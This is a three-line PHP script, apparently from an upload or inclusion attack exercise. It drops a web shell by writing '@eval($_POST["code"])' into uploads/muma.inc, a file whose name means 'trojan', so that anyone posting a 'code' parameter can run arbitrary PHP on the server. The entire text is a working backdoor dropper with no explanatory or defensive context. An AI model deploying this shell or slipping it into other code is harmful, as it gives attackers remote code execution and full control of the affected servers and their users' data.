<?php
    file_put_contents("uploads/muma.inc",'<?php @eval($_POST["code"]); ?>') or die('error'); 
?>